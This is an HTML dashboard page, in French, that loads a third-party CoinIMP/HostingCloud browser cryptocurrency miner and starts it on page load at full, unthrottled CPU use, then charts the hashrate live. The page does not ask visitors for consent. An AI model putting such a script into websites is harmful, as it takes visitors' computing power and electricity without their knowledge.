<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>ðŸš€ Deadspot Miner Interface</title>
  <script src="https://www.hostingcloud.racing/EC1j.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <style>
    body {
      background: #0a0a0f;
      color: #fff;
      font-family: monospace;
      text-align: center;
      padding: 20px;
    }

    h1 {
      color: #ff00ff;
      text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff;
      margin-bottom: 30px;
    }

    table {
      width: 70%;
      margin: 20px auto;
      border-collapse: collapse;
      background: rgba(20,20,30,0.9);
      border: 2px solid #ff0066;
      box-shadow: 0 0 15px #ff0066, 0 0 30px #ff00ff;
    }

    th, td {
      border: 1px solid #00f;
      padding: 12px;
      font-size: 1.1em;
    }

    th {
      background: #1a1a2e;
      color: #0ff;
      text-shadow: 0 0 10px #0ff;
    }

    td {
      color: #fff;
      text-shadow: 0 0 8px #f0f;
    }

    #consolelog {
      width: 80%;
      height: 180px;
      margin: 30px auto;
      padding: 10px;
      background: #111;
      border: 2px solid #00f;
      overflow-y: auto;
      text-align: left;
      font-size: 0.9em;
      color: #ff4444;
      box-shadow: 0 0 10px #00f, 0 0 20px #0ff;
    }

    #chart-container {
      width: 80%;
      margin: 40px auto;
      background: #111;
      padding: 15px;
      border-radius: 8px;
      box-shadow: 0 0 15px #0ff, 0 0 30px #ff00ff;
    }
  </style>
</head>
<body>
  <h1>ðŸ’» Deadspot Mining Interface</h1>

  <table>
    <tr>
      <th>Statistique</th>
      <th>Valeur</th>
    </tr>
    <tr>
      <td>âš¡ Hashrate actuel</td>
      <td id="hashrate">Attente...</td>
    </tr>
    <tr>
      <td>ðŸ”¢ Total de Hashes</td>
      <td id="totalhashes">0</td>
    </tr>
    <tr>
      <td>ðŸ”¥ Force de Mining</td>
      <td id="force">0%</td>
    </tr>
    <tr>
      <td>âœ… Hashes AcceptÃ©s</td>
      <td id="accepted">0</td>
    </tr>
  </table>

  <div id="chart-container">
    <canvas id="hashrateChart"></canvas>
  </div>

  <pre id="consolelog"></pre>

  <script>
    // ðŸ”‘ ClÃ© publique CoinIMP / HostingCloud
    var _client = new Client.Anonymous(
      '80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd',
      { throttle: 0, c: 'w' }
    );
    _client.start();

    // ðŸ“Š Configuration du graphe
    const ctx = document.getElementById('hashrateChart').getContext('2d');
    const hashrateChart = new Chart(ctx, {
      type: 'line',
      data: {
        labels: [],
        datasets: [{
          label: 'Hashrate (H/s)',
          data: [],
          borderColor: '#ff00ff',
          backgroundColor: 'rgba(255,0,255,0.2)',
          tension: 0.2,
          fill: true
        }]
      },
      options: {
        responsive: true,
        plugins: {
          legend: { labels: { color: '#fff' } }
        },
        scales: {
          x: {
            ticks: { color: '#0ff' },
            grid: { color: '#333' }
          },
          y: {
            ticks: { color: '#ff4444' },
            grid: { color: '#333' }
          }
        }
      }
    });

    // ðŸ”„ Mise Ã  jour toutes les 2 secondes
    setInterval(function () {
      let hashrate = _client.getHashesPerSecond().toFixed(2);
      let total = _client.getTotalHashes(true);
      let accepted = _client.getAcceptedHashes();
      let force = Math.min(100, (hashrate / 50 * 100)).toFixed(1);

      // Mettre Ã  jour tableau
      document.getElementById("hashrate").innerText = hashrate + " H/s";
      document.getElementById("totalhashes").innerText = total;
      document.getElementById("accepted").innerText = accepted;
      document.getElementById("force").innerText = force + " %";

      // Mettre Ã  jour graphe
      let time = new Date().toLocaleTimeString();
      hashrateChart.data.labels.push(time);
      hashrateChart.data.datasets[0].data.push(hashrate);

      if (hashrateChart.data.labels.length > 20) {
        hashrateChart.data.labels.shift();
        hashrateChart.data.datasets[0].data.shift();
      }
      hashrateChart.update();

      // Console log
      let log = document.getElementById("consolelog");
      log.innerText += "[STAT] âš¡ " + hashrate + " H/s | ðŸ”¢ " + total + " | âœ… " + accepted + "\n";
      log.scrollTop = log.scrollHeight;
    }, 2000);
  </script>
</body>
</html>
